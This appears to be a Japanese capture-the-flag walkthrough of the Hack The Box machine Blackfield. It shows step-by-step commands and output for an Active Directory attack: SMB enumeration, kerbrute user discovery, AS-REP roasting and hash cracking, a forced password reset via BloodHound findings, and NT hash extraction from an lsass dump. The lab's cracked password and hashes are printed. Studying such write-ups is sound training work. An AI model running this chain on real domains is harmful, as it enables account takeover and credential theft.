# Recon

SMBシェアへアノニマスログイン：
```
┌──(shoebill㉿shoebill)-[~]
└─$ smbclient -L 10.10.10.192                            
Password for [WORKGROUP\shoebill]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share
```

profiles$を除くとたくさんのフォルダがある：


```
┌──(shoebill㉿shoebill)-[~]
└─$ smbclient '//10.10.10.192/profiles$'
smb: \> dir
  .                                   D        0  Thu Jun  4 01:47:12 2020
  ..                                  D        0  Thu Jun  4 01:47:12 2020
  AAlleni                             D        0  Thu Jun  4 01:47:11 2020
  ABarteski                           D        0  Thu Jun  4 01:47:11 2020
  ABekesz                             D        0  Thu Jun  4 01:47:11 2020
...
  ZScozzari                           D        0  Thu Jun  4 01:47:12 2020
  ZTimofeeff                          D        0  Thu Jun  4 01:47:12 2020
  ZWausik                             D        0  Thu Jun  4 01:47:12 2020
```

フォルダ名がユーザ名っぽいので、これらよりユーザリストusers.txtを作る：

```

┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ cat users.txt            
AAlleni
ABarteski
ABekesz
...
ZMiick
ZScozzari
ZTimofeeff
ZWausik
```
`kerbrute`で有効なユーザが三人見つかった：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ kerbrute userenum -v --dc 10.10.10.192 -d BLACKFIELD.local users.txt             

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

...
2022/10/28 13:46:02 >  [+] VALID USERNAME:	 audit2020@BLACKFIELD.local
...
2022/10/28 13:48:38 >  [+] VALID USERNAME:	 support@BLACKFIELD.local
...
2022/10/28 13:48:44 >  [+] VALID USERNAME:	 svc_backup@BLACKFIELD.local
```

この三人の名前をvalid_users.txtとして保存する。

そのユーザリストを使ってGetNPUsers.pyを実行する：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ impacket-GetNPUsers BLACKFIELD.local/ -no-pass -dc-ip 10.10.10.192 -usersfile valid_users.txt 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:953f9fcfb82c8ed65373a86861b8a7d6$006dd8c5f10c903610330d00c92c47cd3fb61c0966447d13c48011d6f40de4b8c5584a9be9b5c0e593f32d650665628ba1327550fb08b32e8c4fb3e64f50e7715a6bed96560cc4a44460f2bd891a673dd82bb082cf5447d4c320f9a8af2309c560ccd442f954275eb26902c18ead4f48c47a4f6e92d009357df9ea2a72e6c4f62e4f4e67a2606be502d7add27d6547c2d2463e2bbaf42a021ea80b731167be74c08abea059dfdb1eff1d5382b6d4e5604872b532a02af341b046ebf78ca96b4191393282441d54e12ed6abff47c4ae578c9d74d16ab0546799159d98188998154e278e1f63f3dcff0f8e80b869361f01796d18e1
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
ユーザsupportのハッシュが得られたので、これをhashというファイル名で保存してクラックする：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$support@BLACKFIELD.LOCAL:95...18e1:#00^BlackKnight
```
supportのクリデンシャルを使ってbloodhoundを実行する。

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```

![hound-1](https://user-images.githubusercontent.com/85237728/198561622-a9cc4ee3-d39c-4b3c-bdee-154184de7fe7.png)

supportはaudit2020のパスワードを設定することができると判明（audit2020の現在のパスワードを知らなくても変更可能）。

そこで、audit2020のパスワードをPassw0rd2020に設定する：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ net rpc password audit2020 -U support -S 10.10.10.192
Enter new password for audit2020:
Password for [WORKGROUP\support]:
```
（コロンの次に入力した文字は表示されない）

audit2020のクリデンシャルでforensicというSMBシェアへアクセスする：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ smbclient -U 'audit2020%Passw0rd2020' //10.10.10.192/forensic
Try "help" to get a list of possible commands.
smb: \>
```

# initial shell

lsassに関するファイルがあったのでダウンロードする：

```
smb: \> dir
  .                                   D        0  Sun Feb 23 22:03:16 2020
  ..                                  D        0  Sun Feb 23 22:03:16 2020
  commands_output                     D        0  Mon Feb 24 03:14:37 2020
  memory_analysis                     D        0  Fri May 29 05:28:33 2020
  tools                               D        0  Sun Feb 23 22:39:08 2020
smb: \> cd memory_analysis\
smb: \memory_analysis\> dir
  .                                   D        0  Fri May 29 05:28:33 2020
  ..                                  D        0  Fri May 29 05:28:33 2020
  conhost.zip                         A 37876530  Fri May 29 05:25:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 05:25:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 05:25:54 2020
  dllhost.zip                         A 18366396  Fri May 29 05:26:04 2020
  ismserv.zip                         A  8810157  Fri May 29 05:26:13 2020
  lsass.zip                           A 41936098  Fri May 29 05:25:08 2020
  mmc.zip 
...
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (1884.9 KiloBytes/sec) (average 1345.9 KiloBytes/sec)
```

解凍するとlsass.DMPが得られた！！
```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ unzip lsass.zip
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192/Lsass]
└─$ ls             
lsass.DMP  lsass.zip
```

`pypykatz`で中身を読み出す：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ pypykatz lsa minidump lsass.DMP
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
...
```


